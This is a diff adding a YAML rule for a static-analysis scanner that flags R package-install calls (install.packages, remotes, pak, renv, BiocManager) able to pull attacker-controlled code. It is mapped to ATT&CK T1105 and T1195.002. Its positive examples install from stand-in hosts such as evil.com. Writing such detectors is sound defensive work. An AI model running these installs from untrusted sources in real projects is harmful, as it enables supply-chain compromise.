@@ -1,0 +1,83 @@
+name: install_pattern
+version: "0.1.0"
+type: warning
+attck:
+  - T1105
+  - T1195.002
+message: >-
+  These functions install packages, optionally from a specified or remote
+  source. A non-default source can introduce attacker-controlled code.
+xpath: >-
+  //SYMBOL_FUNCTION_CALL[
+    (
+      text() = 'install.packages' or text() = 'install_github'
+      or text() = 'install_gitlab' or text() = 'install_bitbucket'
+      or text() = 'install_git' or text() = 'install_url'
+      or text() = 'install_version' or text() = 'install_local'
+      or text() = 'install_bioc' or text() = 'install_dev'
+      or text() = 'install_cran' or text() = 'pak'
+      or text() = 'pkg_install' or text() = 'local_install'
+      or text() = 'lockfile_install'
+    )
+    and not(preceding-sibling::OP-DOLLAR)
+    and not(preceding-sibling::OP-AT)
+  ]
+  |
+  //SYMBOL_FUNCTION_CALL[
+    text() = 'install'
+    and preceding-sibling::SYMBOL_PACKAGE[
+      text() = 'BiocManager' or text() = 'renv' or text() = 'devtools'
+    ]
+  ]
+positive_examples:
+  - |
+    install.packages("foo", repos = "https://evil.com/cran")
+  - |
+    utils::install.packages("foo", repos = "https://evil.com/cran")
+  - |
+    devtools::install_github("evil/pkg")
+  - |
+    remotes::install_github("evil/pkg")
+  - |
+    remotes::install_gitlab("evil/pkg")
+  - |
+    remotes::install_bitbucket("evil/pkg")
+  - |
+    remotes::install_git("https://evil.com/pkg.git")
+  - |
+    remotes::install_url("https://evil.com/pkg.tar.gz")
+  - |
+    remotes::install_version("foo", version = "0.1.0")
+  - |
+    remotes::install_local("pkg.tar.gz")
+  - |
+    remotes::install_bioc("evil/pkg")
+  - |
+    remotes::install_dev("foo")
+  - |
+    remotes::install_cran("foo")
+  - |
+    pak::pak("evil/pkg")
+  - |
+    pak::pkg_install("evil/pkg")
+  - |
+    pak::local_install("pkg")
+  - |
+    pak::lockfile_install("pkg.lock")
+  - |
+    BiocManager::install("evil")
+  - |
+    renv::install("evil/pkg")
+  - |
+    devtools::install()
+negative_examples:
+  - |
+    foo$install.packages("x")
+  - |
+    foo@install_github("x")
+  - |
+    foo$pkg_install("x")
+  - |
+    install("x")
+  - |
+    foo$install("x")
